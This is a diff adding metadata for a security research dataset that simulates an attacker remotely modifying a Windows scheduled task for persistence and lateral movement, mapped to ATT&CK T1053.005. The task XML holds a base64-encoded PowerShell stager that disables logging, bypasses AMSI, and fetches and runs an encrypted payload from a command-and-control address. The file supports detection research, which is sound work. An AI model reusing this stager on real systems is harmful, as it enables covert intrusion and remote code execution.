@@ -1,0 +1,145 @@
+title: Remote Scheduled Task Modification
+id: SDWIN-201219075059
+author: Roberto Rodriguez @Cyb3rWard0g
+creation_date: 2020/12/19
+modification_date: 2020/12/19
+platform: Windows
+tags:
+description: This dataset represents a threat actor modifying a scheduled task remotely.
+attack_mappings:
+  - technique: T1053
+    sub-technique: "005"
+    tactics:
+      - TA0002
+      - TA0003
+      - TA0004
+      - TA0008
+notebooks:
+files:
+- type: Host
+  link: https://raw.githubusercontent.com/OTRF/mordor/master/datasets/small/windows/lateral_movement/host/schtask_modification.zip
+- type: Network
+  link: https://raw.githubusercontent.com/OTRF/mordor/master/datasets/small/windows/lateral_movement/network/schtask_modification.zip
+simulation:
+  environment: Lab VM
+  tools:
+    - type: Manual
+      name: PowerShell
+      module: PowerShell
+      script:
+  permissions_required:
+    - Administrator
+  adversary_view: |-
+      Name               : EventCacheManager
+      Path               : \Microsoft\Windows\SoftwareProtectionPlatform\EventCacheManager
+      State              : 3
+      Enabled            : True
+      LastRunTime        : 11/30/1999 12:00:00 AM
+      LastTaskResult     : 267011
+      NumberOfMissedRuns : 0
+      NextRunTime        : 12/30/1899 12:00:00 AM
+      Definition         : System.__ComObject
+      Xml                : <?xml version="1.0" encoding="UTF-16"?>
+                          <Task version="1.2"
+                          xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
+                            <RegistrationInfo>
+                              <Date>2020-12-19T07:00:22</Date>
+                              <Author>THESHIRE\pgustavo</Author>
+                              <URI>\Microsoft\Windows\SoftwareProtectionPlatform\EventCacheManager</URI>
+                            </RegistrationInfo>
+                            <Principals>
+                              <Principal id="Author">
+                                <UserId>S-1-5-18</UserId>
+                              </Principal>
+                            </Principals>
+                            <Settings>
+                              <DisallowStartIfOnBatteries>true</DisallowStartIfOnBatteries>
+                              <StopIfGoingOnBatteries>true</StopIfGoingOnBatteries>
+                              <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
+                              <IdleSettings>
+                                <Duration>PT10M</Duration>
+                                <WaitTimeout>PT1H</WaitTimeout>
+                                <StopOnIdleEnd>true</StopOnIdleEnd>
+                                <RestartOnIdle>false</RestartOnIdle>
+                              </IdleSettings>
+                            </Settings>
+                            <Triggers>
+                              <BootTrigger>
+                                <StartBoundary>2020-12-19T07:00:00</StartBoundary>
+                              </BootTrigger>
+                            </Triggers>
+                            <Actions Context="Author">
+                              <Exec>
+                                <Command>powershell</Command>
+                                <Arguments>-noP -sta -w 1 -enc  SQBGACgAJABQAFMAVgBFAHIAcwBpAG8ATgBUAGEA
+                          QgBsAEUALgBQAFMAVgBFAFIAUwBJAG8ATgAuAE0AYQBKAG8AcgAgAC0AZwBFACAAMwApAHsAJABDAD
+                          MAMgAyAD0AWwBSAEUARgBdAC4AQQBzAFMAZQBNAEIAbABZAC4ARwBFAHQAVAB5AFAAZQAoACcAUwB5
+                          AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAFUAdA
+                          BpAGwAcwAnACkALgAiAEcARQB0AEYASQBlAGAAbABEACIAKAAnAGMAYQBjAGgAZQBkAEcAcgBvAHUA
+                          cABQAG8AbABpAGMAeQBTAGUAdAB0AGkAbgBnAHMAJwAsACcATgAnACsAJwBvAG4AUAB1AGIAbABpAG
+                          MALABTAHQAYQB0AGkAYwAnACkAOwBJAEYAKAAkAGMAMwAyADIAKQB7ACQAYwA3ADQAMgA9ACQAYwAz
+                          ADIAMgAuAEcAZQBUAFYAYQBsAFUAZQAoACQAbgBVAGwAbAApADsASQBGACgAJABDADcANAAyAFsAJw
+                          BTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AKQB7ACQAYwA3ADQA
+                          MgBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG
+                          4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAw
+                          ADsAJABDADcANAAyAFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZw
+                          AnAF0AWwAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAbABvAGMAawBJAG4AdgBvAGMAYQB0AGkA
+                          bwBuAEwAbwBnAGcAaQBuAGcAJwBdAD0AMAB9ACQAVgBBAEwAPQBbAEMAbwBsAGwARQBjAHQASQBvAG
+                          4AUwAuAEcAZQBuAGUAUgBpAGMALgBEAEkAYwB0AGkATwBOAGEAUgBZAFsAcwBUAHIAaQBuAGcALABT
+                          AFkAcwBUAEUAbQAuAE8AYgBKAGUAYwB0AF0AXQA6ADoAbgBFAHcAKAApADsAJAB2AEEATAAuAEEARA
+                          BEACgAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4A
+                          ZwAnACwAMAApADsAJABWAGEATAAuAEEARABEACgAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCAG
+                          wAbwBjAGsASQBuAHYAbwBjAGEAdABpAG8AbgBMAG8AZwBnAGkAbgBnACcALAAwACkAOwAkAEMANwA0
+                          ADIAWwAnAEgASwBFAFkAXwBMAE8AQwBBAEwAXwBNAEEAQwBIAEkATgBFAFwAUwBvAGYAdAB3AGEAcg
+                          BlAFwAUABvAGwAaQBjAGkAZQBzAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzAFwA
+                          UABvAHcAZQByAFMAaABlAGwAbABcAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAG
+                          kAbgBnACcAXQA9ACQAdgBBAGwAfQBFAEwAUwBlAHsAWwBTAEMAcgBpAHAAVABCAGwATwBDAGsAXQAu
+                          ACIARwBFAFQARgBJAGUAYABMAGQAIgAoACcAcwBpAGcAbgBhAHQAdQByAGUAcwAnACwAJwBOACcAKw
+                          AnAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMAZQBUAFYAYQBMAHUARQAoACQA
+                          bgB1AGwAbAAsACgATgBFAFcALQBPAGIASgBFAEMAVAAgAEMAbwBMAGwAZQBDAFQASQBvAE4AcwAuAE
+                          cARQBuAGUAUgBJAEMALgBIAGEAcwBoAFMAZQB0AFsAcwBUAHIAaQBOAEcAXQApACkAfQAkAFIAZQBG
+                          AD0AWwBSAGUARgBdAC4AQQBzAFMAZQBtAGIAbABZAC4ARwBlAHQAVABZAFAAZQAoACcAUwB5AHMAdA
+                          BlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkA
+                          JwArACcAVQB0AGkAbABzACcAKQA7ACQAUgBlAGYALgBHAGUAdABGAGkARQBMAGQAKAAnAGEAbQBzAG
+                          kASQBuAGkAdABGACcAKwAnAGEAaQBsAGUAZAAnACwAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABh
+                          AHQAaQBjACcAKQAuAFMARQB0AFYAYQBMAFUAZQAoACQATgBVAEwATAAsACQAVABSAFUARQApADsAfQ
+                          A7AFsAUwBZAFMAVABFAE0ALgBOAGUAdAAuAFMAZQBSAFYASQBDAGUAUABPAEkAbgB0AE0AYQBOAGEA
+                          RwBFAFIAXQA6ADoARQBYAFAAZQBjAFQAMQAwADAAQwBPAE4AdABpAE4AdQBFAD0AMAA7ACQANQA3AD
+                          kAMwA9AE4ARQB3AC0ATwBiAEoAZQBjAFQAIABTAHkAcwBUAGUATQAuAE4ARQBUAC4AVwBFAEIAQwBM
+                          AGkAZQBuAFQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcw
+                          AgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAA
+                          cgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAJABzAGUAcgA9ACQAKABbAF
+                          QARQB4AFQALgBFAG4AYwBPAGQAaQBuAGcAXQA6ADoAVQBuAEkAQwBPAEQARQAuAEcARQB0AFMAdABS
+                          AGkAbgBHACgAWwBDAG8AbgBWAGUAcgB0AF0AOgA6AEYAcgBPAE0AQgBhAHMARQA2ADQAUwB0AHIASQ
+                          BOAGcAKAAnAGEAQQBCADAAQQBIAFEAQQBjAEEAQQA2AEEAQwA4AEEATAB3AEEAeABBAEQAQQBBAEwA
+                          ZwBBAHgAQQBEAEEAQQBMAGcAQQB4AEEARABBAEEATABnAEEAMQBBAEEAPQA9ACcAKQApACkAOwAkAH
+                          QAPQAnAC8AbABvAGcAaQBuAC8AcAByAG8AYwBlAHMAcwAuAHAAaABwACcAOwAkADUANwA5ADMALgBI
+                          AGUAYQBkAGUAcgBTAC4AQQBEAGQAKAAnAFUAcwBlAHIALQBBAGcAZQBuAHQAJwAsACQAdQApADsAJA
+                          A1ADcAOQAzAC4AUAByAE8AWAB5AD0AWwBTAHkAcwB0AGUATQAuAE4ARQBUAC4AVwBFAGIAUgBlAHEA
+                          VQBFAFMAdABdADoAOgBEAEUARgBhAHUAbAB0AFcARQBiAFAAUgBPAFgAeQA7ACQANQA3ADkAMwAuAF
+                          AAcgBvAFgAWQAuAEMAUgBlAEQARQBuAFQAaQBBAGwAcwAgAD0AIABbAFMAWQBTAHQARQBNAC4ATgBF
+                          AFQALgBDAHIARQBkAEUATgBUAGkAQQBMAEMAYQBjAEgARQBdADoAOgBEAEUAZgBhAFUAbABUAE4AZQ
+                          BUAHcAbwBSAGsAQwByAEUAZABFAE4AdABJAGEATABzADsAJABTAGMAcgBpAHAAdAA6AFAAcgBvAHgA
+                          eQAgAD0AIAAkADUANwA5ADMALgBQAHIAbwB4AHkAOwAkAEsAPQBbAFMAWQBTAHQAZQBtAC4AVABFAH
+                          gAVAAuAEUATgBjAE8AZABJAE4AZwBdADoAOgBBAFMAQwBJAEkALgBHAGUAVABCAFkAdABlAFMAKAAn
+                          ACMANgBGACsAPgBFADgAMgA3AEgAVgBKAEcARAB0AG0AOQB9AFQAQAAqADEAaQB4AD0AXwBkAG4ASQ
+                          A0AFAAZQAnACkAOwAkAFIAPQB7ACQARAAsACQASwA9ACQAQQBSAEcAcwA7ACQAUwA9ADAALgAuADIA
+                          NQA1ADsAMAAuAC4AMgA1ADUAfAAlAHsAJABKAD0AKAAkAEoAKwAkAFMAWwAkAF8AXQArACQASwBbAC
+                          QAXwAlACQASwAuAEMAbwB1AE4AVABdACkAJQAyADUANgA7ACQAUwBbACQAXwBdACwAJABTAFsAJABK
+                          AF0APQAkAFMAWwAkAEoAXQAsACQAUwBbACQAXwBdAH0AOwAkAEQAfAAlAHsAJABJAD0AKAAkAEkAKw
+                          AxACkAJQAyADUANgA7ACQASAA9ACgAJABIACsAJABTAFsAJABJAF0AKQAlADIANQA2ADsAJABTAFsA
+                          JABJAF0ALAAkAFMAWwAkAEgAXQA9ACQAUwBbACQASABdACwAJABTAFsAJABJAF0AOwAkAF8ALQBiAH
+                          gATwByACQAUwBbACgAJABTAFsAJABJAF0AKwAkAFMAWwAkAEgAXQApACUAMgA1ADYAXQB9AH0AOwAk
+                          ADUANwA5ADMALgBIAEUAQQBkAEUAUgBzAC4AQQBEAGQAKAAiAEMAbwBvAGsAaQBlACIALAAiAFcAVQ
+                          BFAGgAaABKAGMAQQBxAEQAbwA9AE4AVgByAE8AYwBsAEQAYQBmAG0AcQBOADAAdABBAEcAMgBGACsA
+                          TQAvAEwAagBFAHgAdgA4AD0AIgApADsAJABkAGEAVABhAD0AJAA1ADcAOQAzAC4ARABvAHcATgBMAE
+                          8AYQBkAEQAQQBUAEEAKAAkAFMAZQBSACsAJABUACkAOwAkAEkAVgA9ACQARABhAHQAYQBbADAALgAu
+                          ADMAXQA7ACQARABhAHQAYQA9ACQAZABBAHQAYQBbADQALgAuACQAZABhAFQAQQAuAEwAZQBOAGcAVA
+                          BIAF0AOwAtAGoAbwBJAE4AWwBDAEgAYQByAFsAXQBdACgAJgAgACQAUgAgACQARABhAHQAQQAgACgA
+                          JABJAFYAKwAkAEsAKQApAHwASQBFAFgA</Arguments>
+                              </Exec>
+                            </Actions>
+                          </Task>
+references:
+  - https://www.microsoft.com/security/blog/2020/12/18/analyzing-solorigate-the-compromised-dll-file-that-started-a-sophisticated-cyberattack-and-how-microsoft-defender-helps-protect/
+  - https://github.com/OTRF/Blacksmith/blob/master/resources/scripts/powershell/misc/Update-RemoteTask.ps1
